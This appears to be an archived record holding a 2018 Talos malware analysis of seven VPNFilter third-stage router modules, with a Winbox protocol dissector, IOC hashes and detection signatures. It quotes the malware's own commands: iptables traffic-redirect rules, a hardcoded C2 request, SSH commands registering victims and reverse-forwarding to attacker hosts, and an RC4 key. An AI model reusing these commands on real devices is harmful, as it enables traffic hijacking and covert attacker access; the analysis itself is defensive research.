{
    "id": "a2f3557d-7238-45cf-a659-40f2bf91a168",
    "created_at": "2023-01-12T15:07:37.753334Z",
    "updated_at": "2025-03-27T02:05:55.947231Z",
    "deleted_at": null,
    "sha1_hash": "d71ed5db85d82e0c17f46b8b7b3cd6bdc2a38015",
    "title": "2018-09-26 - VPNFilter III- More Tools for the Swiss Army Knife of Malware",
    "authors": "",
    "file_creation_date": "2022-05-27T21:58:05Z",
    "file_modification_date": "2022-05-27T21:58:05Z",
    "file_size": 559101,
    "plain_text": "# VPNFilter III: More Tools for the Swiss Army Knife of Malware\n\n**blog.talosintelligence.com/2018/09/vpnfilter-part-3.html**\n\n## Summary\n\nVPNFilter — [a multi-stage, modular framework that has infected hundreds of thousands of](https://blog.talosintelligence.com/2018/05/VPNFilter.html)\nnetwork devices across the globe — is now known to possess even greater capabilities.\nCisco Talos recently discovered seven additional third-stage VPNFilter modules that add\nsignificant functionality to the malware including an expanded ability to exploit endpoint\n\n\n-----\n\ndevices from footholds on compromised network devices. The new functions also include\ndata filtering and multiple encrypted tunneling capabilities to mask command and control\n(C2) and data exfiltration traffic. And while we believe our work, and the work of our\ninternational coalition of partners, has mostly neutralized the threat from VPNFilter, it can still\nbe difficult to detect in the wild if any devices remain unpatched.\n\n[Talos has been researching VPNFilter for months. Our initial findings are outlined here, and a](https://blog.talosintelligence.com/2018/05/VPNFilter.html)\n[description of additional modules used by the framework is here. As part of our continued](https://blog.talosintelligence.com/2018/06/vpnfilter-update.html)\ninvestigation, we developed a technique to examine a key protocol used by MikroTik\nnetworking devices to hunt for possible exploitation methods used by the actor.\n\nAs we followed the thread of VPNFilter infections, it became clear that MikroTik network\ndevices were heavily targeted by the threat actor, especially in Ukraine. Since these devices\nseemed to be critical to the actor's operational goals, this led us to try to understand how\nthey were being exploited. Part of our investigation included the study of the protocol used by\nMikroTik's Winbox administration utility. In this blog, we'll share how and why we studied this\nprotocol, as well as the decoder tool we developed as a way of helping the security\ncommunity look into this protocol for potential malicious actor activity.\n\nThe sophistication of VPNFilter drives home the point that this is a framework that all\nindividuals and organizations should be tracking. Only an advanced and organized defense\ncan combat these kinds of threats, and at the scale that VPNFilter is at, we cannot afford to\noverlook these new discoveries.\n\n## Expanded VPNFilter capabilities\n\nThe discovery of these additional VPNFilter third-stage modules has significantly added to\nour understanding of what we already knew to be an extremely potent threat. Together, these\nmodules added:\n\n1. Additional capabilities that could be leveraged to map networks and exploit endpoint\n\nsystems that are connected to devices compromised by VPNFilter.\n2. Multiple ways for the threat actor to obfuscate and/or encrypt malicious traffic, including\n\ncommunications used for C2 and data exfiltration.\n3. Multiple tools that could be utilized to identify additional victims accessible from the\n\nactor's foothold on devices compromised by VPNFilter for both lateral movement within\na network, as well as to identify new edge devices in other networks of interest to the\nactor.\n4. The capacity to build a distributed network of proxies that could be leveraged in future\n\nunrelated attacks to provide a means of obfuscating the true source of attack traffic by\nmaking it appear as if the attacks originated from devices previously compromised by\nVPNFilter.\n\n\n-----\n\nWe were able to confirm the existence and capabilities of the malware after reverseengineering these additional modules. Previously, we had to make analytic assessments on\nthe existence and nature of these capabilities based solely on telemetry analysis, which\nalways leaves room for error.\n\nFor example, we had previously noted what appeared to be devices compromised by\nVPNFilter conducting scans of large IP spaces that seemed focused on identifying other\ndevices vulnerable to the methods of exploitation used by the actor associated with the\nVPNFilter malware. However, now we can discuss the specific third-stage module used for\nthis activity.\n\nAs a result of our continued research, we have furthered our understanding of the full scope\nof the capabilities associated with VPNFilter after examining these additional third-stage\nmodules.\n\n## Additional third-stage modules\n\nAs previously described, Talos identified the following seven additional third-stage modules\nthat greatly expanded the capabilities present within VPNFilter.\n\nEach of these modules is described in detail in the following sections.\n\n### 'htpx' (endpoint exploitation module - executable injection)\n\n'htpx' is a third-stage module for VPNFilter. This module shares similar code with the 'ssler'\n[module previously documented by Talos. The module relies heavily on open-source code](https://blog.talosintelligence.com/2018/06/vpnfilter-update.html)\nthat can be traced to the original projects based on strings present within the binary. A good\n[example is 'libiptc.c', which is part of Netfilter.](https://git.netfilter.org/iptables/tree/libiptc/libiptc.c)\n\n\n-----\n\n**Comparison of strings between 'htpx' (left) and 'ssler' (right).**\n\nThe primary function present within the 'htpx' module is responsible for setting up iptables\nrules to forward network traffic destined for TCP port 80 to a local server running on port\n8888. This redirection is accomplished by first loading kernel modules that allow for traffic\nmanagement. These modules (Ip_tables.ko, Iptable_filter.ko, and Iptable_nat.ko) are loaded\nwith the insmod shell command.\n\nThe 'htpx' module then issues the following commands to surreptitiously forward traffic:\n\niptables -I INPUT -p tcp --dport 8888 -j ACCEPT\niptables -t nat -I PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8888\n\nIt also periodically checks to ensure that these rules remain present by issuing similar delete\ncommands then re-adding them. A temp file is also created called /var/run/htpx.pid.\n\nThe following HTTP request is then generated:\n\nGET %s HTTP/1.1\\r\\nHost: 103.6.146.194\\r\\nAccept: */*\\r\\nUser-Agent: curl53\\r\\n\\r\\n\n\nDuring our analysis of the 'htpx' module, we were unable to elicit a response from C2\ninfrastructure, so we were unable to observe additional module operations. During our\nanalysis of the module binary, we identified that the module inspects HTTP communications\nto identify the presence of Windows executables. When they are encountered, the\n\n\n-----\n\nexecutable is flagged and added to a table. We assess with moderate confidence that this\nmodule could be leveraged by attackers to download a binary payload and allow for on-thefly patching of Windows executables as they pass through compromised devices.\n\n### 'ndbr' (multi-functional SSH tool)\n\nThe 'ndbr' module is a module with SSH capabilities that also has the ability to port-scan\nother IPs. This module uses the dropbear SSH server and client and is a modified version of\nthe [dbmulti utility version 2017.75. We have identified several modifications to the standard](https://github.com/mkj/dropbear/blob/master/dbmulti.c)\ndropbear functionality.\n\nThe first modifications are to the dbmulti utility itself. The typical utility can function as an\nSSH client, SSH server, perform data transfers using SCP, generate keys, or convert keys.\nThe functionality is determined either by the program name or the first parameter passed to\nthe program. The 'ndbr' module has replaced the ability to generate or convert keys with a\nnetwork mapping (i.e., port-scanning) function as well as another function called 'ndbr.'\n\nLike the original \"dbmulti\" utility, the 'ndbr' module's functionality depends either on the name\nof the program or the first argument passed to the program. The arguments that the 'ndbr'\nmodule accepts are dropbear, dbclient, ssh, scp, ndbr, and nmap. A description of each of\nthese arguments can be found in the following sections.\n\n**dropbear**\n\nThe dropbear command instructs the 'ndbr' module to operate as an SSH server. The\noriginal dropbear code uses the default SSH port (TCP/22) to listen for connections.\nHowever, the code present within the 'ndbr' module has been modified to use a default port\nof TCP/63914. Other modifications to the original dropbear code change the way that host\nkeyfiles are handled. The default keyfile path has been changed to /db_key, but the 'ndbr'\nmodule does not drop this file. Instead, the buf_readfile dropbear function has been modified\nto load the proper key from memory when the filename parameter is equal to /db_key.\n\nInstead of using password-based authentication, the dropbear server has been modified to\nauthenticate via a proper public key, which is also embedded in the 'ndbr' executable. A bug\nin this modified code mishandles connections attempting to use an incorrect public key.\nThese authentication failures cause the ndbr SSH server to become stuck in an infinite loop.\nThere is no indication to the client, however, that the authentication has failed. At this time,\nwe have been unable to identify a correct key that would allow for successful authentication\nwith the ndbr SSH server — neither of the keys embedded in the 'ndbr' module (i.e., /db_key\nand /cli_key) were correct, and no corresponding keys were found in any other VPNFilterrelated binaries.\n\n**dbclient (ssh)**\n\n\n-----\n\nIf passed the dbclient or ssh parameter, the 'ndbr' module acts as the standard dropbear\nSSH command-line interface client but with modifications to its default options. As with the\ndefault keyfile with dropbear server command, the dbclient/ssh commands have a default\nidentity file: /cli_key. At this time, we do not know what the dbclient (SSH client) is expected\nto connect to.\n\n**nmap**\n\nIf passed the nmap argument, the 'ndbr' module will perform a port scan of an IP or range of\nIPs.\n\nThe usage is:\n\nUsage %s -ip* <ip-addr: 192.168.0.1/ip-range 192.168.0.0./24> -p* <port: 80/port-range: 25125> -noping <default yes> -tcp <default syn> -s <source ip> -h/--help (print this help)\n\n**ndbr**\n\nIf passed the ndbr argument, the 'ndbr' module will do one of three operations based on the\nother parameters it is passed. The SSH commands will make use of the default keys (i.e.,\n/db_key and /cli_key) as described above.\n\nThe third parameter must begin with the word \"start,\" or the 'ndbr' module uninstalls itself.\n\nIf the ndbr module is executed using the following parameters:\n\n$ ./ndbr_<arch> ndbr <param1> <param2> \"start proxy <host> <port>\"\n\nThe following dropbear SSH command will be executed:\n\nssh -y -p <port> prx@<host> srv_ping j(<B64 victim host name>)_<victim MAC address>\n<param2>\n\nThis causes the dropbear SSH client to connect to a remote host and issue the \"srv_ping\"\ncommand, which is likely used to register the victim with a C2 server.\n\nIf the ndbr module is executed using the following parameters:\n\n`$ ./ndbr_<arch> ndbr <param1> <param2> \"start -l <port>\"`\n\nThe dropbear SSH server (as described above) is started and begins listening on the port\nspecified:\n\n`sshd -p <port>`\n\n\n-----\n\nIf the ndbr module is executed with the following parameters:\n\n`$ ./ndbr_<arch> ndbr <param1> <param2> \"start <user> <host> <port>\"`\n\nRemote port forwarding is set up by executing the following dropbear command (see above\nfor explanation of the command options):\n\n`ssh -N -T -y -p <port> -R :127.0.0.1:63914 <user>@<host>`\n\n### 'nm' (network mapper)\n\nThe 'nm' module is used to scan and map the local subnet. It iterates through all interfaces\nand starts by ARP scanning for all hosts on the subnet associated with each IP assigned to\nthe interface. Once an ARP reply is received, nm will send an ICMP echo request to the\ndiscovered host. If an ICMP echo reply is received it will continue mapping by performing a\nport scan, trying to connect to the following remote TCP ports on the host: 9, 21, 22, 23, 25,\n37, 42, 43, 53, 69, 70, 79, 80, 88, 103, 110, 115, 118, 123, 137, 138, 139, 143, 150, 156,\n161, 190, 197, 389, 443, 445, 515, 546, 547, 569, 3306, 8080 or 8291.\n\nNext, it uses the MikroTik Network Discovery Protocol (MNDP) to locate any other MikroTik\ndevices on the local network. If a MikroTik device replies to the MNDP ping, nm extracts the\nMAC address, system identity, version number, platform type, uptime in seconds, RouterOS\nsoftware ID, RouterBoard model, and interface name from the discovered device.\n\nThe nm module looks in /proc/net/arp to get information about the infected device's ARP\ntable, revealing the IP and MAC addresses of neighboring devices. Next, the entire contents\nof /proc/net/wireless are gathered.\n\nThe module performs a traceroute by first creating a TCP connection to 8.8.8.8:53 to confirm\nits availability (no data is sent), then ICMP echo requests are repeatedly sent to this IP with\nincreasing TTLs.\n\nAll of the network information that is gathered is saved to a temporary file named\n/var/run/repsc_<time stamp>.bin. An example .bin file is as follows:\n\n\n-----\n\nThe code responsible for the SSDP, CDP and LLDP functions was present within the module\nbut was never called in the samples analyzed and therefore will always be empty.\n\nThe nm module requires three command line arguments to operate properly, but only the first\nparameter is used. Like several other modules, the first parameter is a folder, and this is the\nlocation where the data is permanently saved. The final task performed by the nm module is\nthe moving of the temporary .bin file containing the results of the scan to a folder specified as\nthe first command line argument, ostensibly for later exfiltration by the main VPNFilter\nprocess.\n\n### 'netfilter' (denial-of-service utility)\n\nnetfilter expects three arguments to be given on the command line. The first two arguments\n\n\n-----\n\nare unused, and the third argument is a quoted string in the format <block/unblock> <# of\nminutes>.\" '# of minutes' is how long netfilter should execute for before exiting. If 'block' was\nused as the first part of the third argument, netfilter adds the following rule to iptables:\n\nChain FORWARD (policy ACCEPT)\ntarget   prot opt source     destination\nDROP    tcp -- anywhere    anywhere    tcpflags: PSH/PSH\n\nAfter adding this rule, netfilter waits 30 seconds and then deletes this rule. If there is still time\nremaining based on the '# of minutes' value, this process begins again. The addition and\ndeletion loop ensures that the rule persists in the event the rule is deleted from the device.\n\nOnce the number of minutes has elapsed, the program exits. Signal handlers are also\ninstalled at the beginning of the netfilter program that deletes the iptables rule and then exit if\nthe program receives either a SIGINT or SIGTERM. This is done so the device works as\nnormal in the event someone manually terminates the netfilter program.\n\nFinally, the 'unblock' argument can be used to delete the iptables rule that was previously\nadded using the 'block' argument.\n\nAlthough there are no other code paths possible, there are indications that there is or could\nhave been something more to this module.\n\nThe first indicator is that all of the different netfilter module samples that Talos analyzed\n(MIPS, PPC, Tile-GX) contain the same list of 168 CIDR IP addresses and ranges which tie\nto the following companies/services:\n\n31.13.64.51 - WhatsApp\n169.44.36.0/25 - WhatsApp\n203.205.167.0/24 - Tencent (Owner of QQ Chat)\n52.0.0.0/16 - Amazon.com, Inc. (The following encrypted applications have used multiple IPs\nin this range: Wikr, Signal, Dust and Confide)\n\nThis indicates that the netfilter module may have been designed to deny access to specific\nforms of encrypted applications, possibly in an attempt to herd victim communications to a\nservice that the actor preferred they use. Interestingly, Telegram, an extremely popular\nencrypted chat application, is missing from the list.\n\nHowever, we were unable to find any references to these strings in the code. All versions of\nnetfilter that we have samples for have this same IP range list but do not appear to use it. It's\npossible that the samples we have are incomplete.\n\nThe iptables rule that is added by the netfilter module drops TCP packets with the PUSH flag\nset. This rule would likely use iptables rules that block all packets not just TCP packets with\nthe PUSH flag set if its purpose is to provide attackers with the ability to launch denial-of\n\n-----\n\nservice attacks using compromised devices. Typically, a rule like this would be useful as part\nof a man-in-the-middle attack enabling attackers with access to the devices to intercept\nforwarded traffic, manipulate it, then manually forward it. This might explain the list of CIDR\nranges as a list of IPs to intercept. We were unable to locate any indication of this sort of\nfunctionality present within the samples that were analyzed.\n\nWe have concluded that the IPs are not used. This may be due to them being left over from\nan older version of the netfilter module, functionality that has not yet been implemented, or\nthere may be modifications to the statically linked iptables library made by the malware\nauthors that we haven't found yet. The VPNFilter authors have modified open-source code\nbefore (e.g. the ndbr module), so it's not unexpected that they would change the libiptc code\nlinked in the netfilter module.\n\n### 'portforwarding' (Allows the forwarding of network traffic to attacker specified infrastructure)\n\nThe portforwarding module is designed to be executed with the following command line\narguments:\n\n./portforwarding <unused> <unused> \"start <IP1> <PORT1> <IP2> <PORT2>\"\n\nGiven these arguments, the portforwarding module will forward traffic from a particular port\nand IP combination to another port and IP by installing the following iptables rules:\n\niptables -t nat -I PREROUTING 1 -p tcp -m tcp -d <IP1> --dport <PORT1> -j DNAT --todestination <IP2>:<PORT2>\n\niptables -t nat -I POSTROUTING 1 -p tcp -m tcp -d <IP2> --dport <PORT2> -j SNAT --tosource <device IP>\n\nThese rules cause any traffic passing through the infected device that is destined to\nIP1:PORT1 to be redirected to IP2:PORT2 instead. The second rule then changes the\nsource address of the rerouted traffic to that of the infected device to ensure the responses\nare sent back to the infected device.\n\nAs a precaution, before installing the iptables rules, the portforwarding module first checks\nthat IP2 is available by creating a socket connection to IP2 on PORT2. However, no data is\nsent before the socket is closed.\n\nLike other modules that manipulate iptables, the portforwarding module enters a loop that\nadds the rules, waits a period of time, deletes the rules and then adds them again to ensure\nthat the rules persist on the device even if they are manually deleted.\n\n\n-----\n\n### socks5proxy (Enables establishment of a SOCKS5 proxy on compromised devices)\n\nThe socks5proxy module is a SOCKS5 proxy server that appears to be based on the open[source project shadowsocks. The server uses no authentication and is hardcoded to listen](https://shadowsocks.org/en/index.html)\non TCP port 5380. Before the server is started, socks5proxy forks to connect to a C2 server\nspecified in arguments supplied to the module. If the server does not respond within a few\nseconds, the fork kills its parent process (the server) and then exits. The C2 server can\nrespond with commands to execute normally or terminate the server.\n\nThis module contains the following usage strings, though they do not line up with the\narguments for the socks5proxy module, and these settings cannot be modified through\ncommand line arguments:\n\nssserver\n\n--username <username> username for auth\n\n--password <password> password for auth\n\n-p, --port <port> server port, default to 1080\n\n-d run in daemon\n\n--loglevel <level> log levels: fatal, error, warning, info, debug, trace\n\n-h, --help help\n\nThe actual command line arguments for the socks5proxy module are:\n\n./socks5proxy <unused> <unused> \"start <C&C IP> <C&C port>\"\n\nThe socks5proxy module verifies the argument count is greater than 1, but the process\ncrashes with a SIGSEV signal if two arguments are given, indicating that there may be\nlimited or poor quality control during some phases of development for this malware toolchain.\n\n### 'tcpvpn' (Enables establishment of a Reverse-TCP VPN on compromised devices)\n\nThe tcpvpn module is a Reverse-TCP VPN, designed to allow a remote attacker to access\ninternal networks behind infected devices. It accomplishes this by beaconing to a remote\nserver, which could be set up like a TunTap device to forward packets over the TCP\nconnection. The connection is seen as outbound by network devices, which may help the\nmodule bypass simple firewalls or NAT issues. This module is similar in concept to\n[penetration testing software Cobalt Strike's VPN Pivoting.](https://www.cobaltstrike.com/help-covert-vpn)\n\nAll data sent through the connection is encrypted with RC4, with a key generated by the\nhardcoded bytes:\n\n\n-----\n\n```\n 213B482A724B7C5F4D77532B45212D215E79433D794A54682E6B653A56796E457A2D7E3B3A2D513B6B515\n\n```\nWhich are sandwiched between the port numbers of the current connection (e.g.,\n\"58586!;H*rK|_MwS+E!-!^yC=yJTh.ke:VynEz-~;:-Q;kQ^w^-~S;QEZh6^jgf_4RzsG80\").\n\nThe command line syntax associated with the tcpvpn module are:\n\n./tcpvpn <unused> <unused> \"start <C&C IP> <C&C port>\"\n\n### MikroTik Research\n\n Introducing the Winbox Protocol Dissector\n\nDuring our research into VPNFilter, we needed to determine how some of the devices were\ncompromised. While examining the MikroTik series of devices, we noticed an open port (TCP\n8291) and that the configuration tool \"Winbox\" uses that port for communication.\n\nThe traffic from these devices appeared as large blobs of binary data, so we weren't able to\ndetermine potential avenues of access using this protocol without a protocol dissector (which\nto our knowledge, didn't exist publicly). We decided to develop our protocol dissector for use\n[with packet analysis tools such as Wireshark to learn more about the protocol, which would](https://www.wireshark.org/)\nallow us to design effective rules to prevent future infections once potential attack vectors\nwere discovered.\n\n[An example of such an attack vector is CVE-2018-14847 which allows an attacker to perform](https://arstechnica.com/information-technology/2018/09/unpatched-routers-being-used-to-build-vast-proxy-army-spy-on-networks/)\na directory traversal for unauthenticated credential recovery. The dissector proved extremely\n[helpful when we wrote coverage for this vulnerability (Snort SID: 47684). While an](https://www.snort.org/advisories/598) [update for](https://blog.mikrotik.com/security/winbox-vulnerability.html)\nthis vulnerability has been released, we think it's essential for security professionals to be\nable to monitor this traffic to help identify any other potentially malicious traffic.\n\nPrivacy can still be maintained by ensuring that you either use \"secure mode\" to encrypt\ncommunications or download the latest Winbox client which communicates over encrypted\nchannels only. This tool will NOT decrypt encrypted communications. The latest MikroTik\nCCR firmware version we tested (6.43.2), enforces the usage of this newer Winbox client\nthough this is only enforced client-side. This means that you CAN still communicate over\ninsecure channels using a custom-made client. Therefore, we believe this Wireshark\ndissector remains useful because an attacker can still deliver an exploit without having to\nreimplement said secure communications.\n\n### What is the \"Winbox Protocol?\"\n\n\n-----\n\nThe term \"Winbox\" comes from the Winbox client offered by MikroTik as an alternative to the\nweb GUI.\n\n[From the official documentation, Winbox is a small utility that allows for the administration of](https://wiki.mikrotik.com/wiki/Manual:Winbox)\nMikroTik RouterOS using a fast and simple GUI. It is a native Win32 binary but can be run on\nLinux and MacOS (OSX) using Wine, an open-source compatibility layer. All Winbox\ninterface functions are as close as possible to mirroring the console functions — that is why\nthere are no Winbox sections in the manual. Some of the advanced and critical system\nconfigurations are not possible from Winbox, like changing the MAC address on an interface.\n\nThe term \"Winbox Protocol\" is not official, as far as we know. It's simply the term we chose\nsince it matches the name of their client.\n\n### Using the dissector\n\nInstallation is simple, and since this is a LUA-based dissector, recompilation is not necessary.\nSimply drop the Winbox_Dissector.lua file into your /$HOME/.wireshark/plugins folder. By\ndefault, any TCP traffic to or from TCP port 8291 will be properly decoded as Winbox traffic\nonce the dissector is installed.\n\nWhile a single message from the client/server to its destination would be preferable for\nparsing purposes, this is not always the case and observing live communications proved that\nthere are many ways that Winbox messages can be formatted and sent.\n\nBelow is an example of a Winbox communications capture that has the following properties:\n\nMultiple messages sent in the same packet.\nMessages containing one or more two-byte \"chunks\" that need to be removed before\nparsing.\nMessages too long for a single packet — TCP reassembly applied.\nMessages containing additional \"nested\" messages\n\nHere is how the capture is displayed before installing the dissector:\n\n\n-----\n\nThe communications are correctly parsed in Wireshark following installation of the Winbox\nprotocol dissector:\n\n\n-----\n\n### Obtaining the Dissector\n\nTo improve the security community's ability to analyze these communications and to monitor\nfor threats that may attempt to take advantage of the Winbox Protocol, Cisco Talos is\nreleasing this dissector for public use. For additional information and to obtain the dissector,\n[please see the GitHub repository here.](https://github.com/Cisco-Talos/Winbox_Protocol_Dissector)\n\n## Conclusion\n\nAs a result of the capabilities we previously discovered in VPNFilter coupled with our new\nfindings, we now confirm that VPNFilter provides attackers all of the functionality required to\n\n\n-----\n\nleverage compromised network and storage devices to further pivot into and attack systems\nwithin the network environments that are being targeted.\n\nIt also allows attackers to leverage their access to sensitive systems such as gateway and\nrouting devices to perform activities such as network mapping and endpoint exploitation,\nnetwork communications monitoring and traffic manipulation, among other serious threats.\nAnother dangerous capability provided by VPNFilter is the ability to turn compromised\ndevices into proxies that could be leveraged to obfuscate the source of future, unrelated\nattacks by making it appear as if the attacks originate from networks previously compromised\nby VPNFilter. The sophisticated nature of this framework further illustrates the advanced\ncapabilities of the threat actors making use of it, as well as the need for organizations to\ndeploy robust defensive architectures to combat threats such as VPNFilter.\n\nWith this new understanding of VPNFilter, most of our unanswered questions about the\nmalware itself have now been answered. However, there are still significant unknowns about\nthis threat that linger to this day:\n\n**How did the actor gain initial access to affected devices?**\n\nWhile we strongly assess that they utilized widely known, public vulnerabilities based on the\nmakes/models affected by VPNFilter, we still don't have definitive proof of this.\n\n**Is the actor attempting to reconstitute their access?**\n\nBased on our telemetry and information from our partners, it appears that VPNFilter has\nbeen entirely neutralized since we and our international coalition of partners (law\n[enforcement, intelligence organizations, and the Cyber Threat Alliance) countered the threat](https://www.cyberthreatalliance.org/)\nearlier this year. Most C2 channels for the malware have been mitigated. The stage 2\nimplants were non-persistent, so most have likely been cleared from infected devices. We\nhave seen no signs of the actor attempting to reconnect with devices that may still have the\npersistent stage 1 with an open listener.\n\nDoes this mean the actor has abandoned this expansive foothold into the small and home\noffice (SOHO) network device space? Are they instead reconstituting their access by starting\nover, re-exploiting and dropping new unknown malware? Have they given up on having\nbroad worldwide SOHO access in favor of a more tailored approach only going after specific\nkey targets?\n\nWhatever the answers may be, we know that the actor behind VPNFilter is extremely\ncapable and driven by their mission priorities to continually maneuver to achieve their goals.\nIn one form or another, they continue to develop and use the tools and frameworks\nnecessary to achieve their mission objective(s).\n\n## IOCs\n\n\n-----\n\na43a4a218cf5755ce7a7744702bb45a34321339ab673863bf6f00ac193cf55fc\naac52856690468687bbe9e357d02835e9f5226a85eacc19c34ff681c50a6f0d8\n13165d9673c240bf43630cddccdc4ab8b5672085520ee12f7596557be02d3605\nb81f857cd8efab6e6e5368b1c00d93505808b0db4b773bee1843a3bc948d3f4f\n809f93cbcfe5e45fae5d69ca7e64209c02647660d1a79b52ec6d05071b21f61a\n7ff2e167370e3458522eaa7b0fb81fe21cd7b9dec1c74e7fb668e92e261086e0\n81368d8f30a8b2247d5b1f8974328e9bd491b574285c2f132108a542ea7d38c7\nb301d6f2ba8e532b6e219f3d9608a56d643b8f289cfe96d61ab898b4eab0e3f5\n99e1db762ff5645050cea4a95dc03eac0db2ceb3e77d8f17b57cd6e294404cc7\n76bf646fce8ff9be94d48aad521a483ee49e1cb53cfd5021bb8b933d2c4a7f0f\ne009b567516b20ef876da6ef4158fad40275a960c1efd24c804883ae273566b0\n7c06b032242abefe2442a8d716dddb216ec44ed2d6ce1a60e97d30dbba1fb643\nf8080b9bfc1bd829dce94697998a6c98e4eb6c9848b02ec10555279221dd910a\n4e350d11b606a7e0f5e88270938f938b6d2f0cc8d62a1fdd709f4a3f1fa2c828\nf1cf895d29970c5229b6a640c253b9f306185d4e99f4eac83b7ba1a325ef9fb8\n8395e650e94b155bbf4309f777b70fa8fdc44649f3ab335c1dfdfeb0cdee44ff\na249a69e692fff9992136914737621f117a7d8d4add6bac5443c002c379fe072\n5e75b8b5ebbef78f35b00702ced557cf0f30f68ee08b399fc26a3e3367bb177b\nfe022403a9d4c899d8d0cb7082679ba608b69091a016e08ad9e750186b1943dd\n116d584de3673994e716e86fbb3945e0c6102bfbd30c48b13872a808091e6bc9\n4263c93ce53d7f88c62fecb6a948d70e51c19e1049e07df2c70a467bcefee2c8\n5d70e7dd5872cc0d7d0f7015c11400e891c939549c01922bff2bbe3b7d5d1ce3\n5c52f115ab8a830d402fac8627d0bfdcbbfd4dcf0e6ad8154d49bb85387893aa\ne75e224c909c9ead4cb50cd772f606407b09b146051bfb28015fcbe27b4a5e8d\n999f14044f41adfd9fb6c97c04d7d2fd9af01724b3ab69739acf615654abfa43\nb118b23a192f372616efe8c2b12977d379ac76df22493c14361587bd1cc8a804\n7ba0dc46510492a7f6c9b2bcc155333898d677cd8a88fe0e1ac1ad3852f1c170\n83b3dbf7f6bc5f98151b26781fa892fc1a014c62af18c95ae537848204f413b8\nfce03f57b3fd3842efac3ce676687794c4decc29b612068e578134f3c4c4296a\n1f26b69a353198bb047dde86d48198be8271e07f8c9d647d2f562207e1330a37\n1e824654afba03678f8177e065c487a07192069711eeb4abe397010771b463b5\n84227f906c7f49071d6598b9035fc785d2b144a6349d0cf7c29177c00db2dc2f\n6eb09f805a68b29c9516d649019bea0bb4796e504ca379783455508a08f61087\naa5baa135b2ada5560833747260545d6a5b49558f6244c0f19443dc87c00294d\n4c5e21125738c330af1bfe5cabc5f18fa14bbef53805dda2c3c31974555f7ec5\n0f3746f273281472e7181f1dd1237f0c9fc26f576a883f42413c759f381006c4\nacfc72b8d6611dc9cd6a3f1a4484aa0adfb404ad5faaa8b8db5747b0ff05bc22\nfe9c17ac036622b2d73466f62b5d095edda2d3b60fa546a48d0bb18f8b11059f\n830091904dab92467956b91555bc88fa7e6bbde514b8a90bb078c8a3bb2f39a9\n5a28ad479d55275452e892b799c32803f81307079777bb1a5c4d24477206d16b\n8440128350e98375b7eff67a147dfe4e85067d67f2ad20d9485f3de246505a5f\n\n\n-----\n\n275c4e86218915c337d7e37e7caba36cb830512b17353bf9716c4ba6dceb33ed\nb700207c903e8da41f33f11b69f703324ec79eb56c98b22efaeac0a10447ec44\n2aa149a88539e8dd065c8885053a30d269be63d41a5db3f66c1982202761aa75\n1a11240d0af108720de1a8a72ceadef102889f4d5679c1a187559d8d98143b0b\n3b6be595b4183b473964345090077b1df29b0cace0077047b46174cc09c690e1\n620c51f83457d0e8cb985f1aff07c6d4a33da7566297d41af681ae3e5fbd2f80\n4c8da690501c0073a3c262a3079d8efac3fea9e2db9c55f3c512589e9364e85c\nd92282acf3fea66b05a75aba695e98a5ea1cc1151f9e5370f712b69a816bf475\n30382c1e7566d59723ff7ef785a1395711be64873dbca6d86691b1f5d86ba29f\n\n## Coverage\n\nThe following new coverage has been developed to detect additional modules used by\nVPNFilter\n\n**New Snort for ndbr:**\n\nsid:1:47377:1\n\n**New Clam AV:**\n\nUnix.Trojan.Vpnfilter_htpx-6596262-0\n\nUnix.Trojan.Vpnfilter_ndbr-6598711-0\n\nUnix.Trojan.Vpnfilter_netfilter-6599563-0\n\nUnix.Trojan.Vpnfilter_nm-6598714-0\n\nUnix.Trojan.Vpnfilter_portforwarding-6599587-0\n\nUnix.Trojan.Vpnfilter_socks5proxy-6599614-0\n\nUnix.Trojan.Vpnfilter_tcpvpn-6606298-0\n\n**Updated Clam AV:**\n\nThe following ClamAV signatures were updated to improve detection of additional Stage 1\nand Stage 2 modules used by VPNFilter:\n\nUnix.Trojan.Vpnfilter-6425812-1\n\nUnix.Trojan.Vpnfilter-6550592-1\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2018/2018-09-26 - VPNFilter III- More Tools for the Swiss Army Knife of Malware.pdf"
    ],
    "report_names": [
        "2018-09-26 - VPNFilter III- More Tools for the Swiss Army Knife of Malware.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673536057,
    "ts_updated_at": 1743041155,
    "ts_creation_date": 1653688685,
    "ts_modification_date": 1653688685,
    "files": {
        "pdf": "https://archive.orkl.eu/d71ed5db85d82e0c17f46b8b7b3cd6bdc2a38015.pdf",
        "text": "https://archive.orkl.eu/d71ed5db85d82e0c17f46b8b7b3cd6bdc2a38015.txt",
        "img": "https://archive.orkl.eu/d71ed5db85d82e0c17f46b8b7b3cd6bdc2a38015.jpg"
    }
}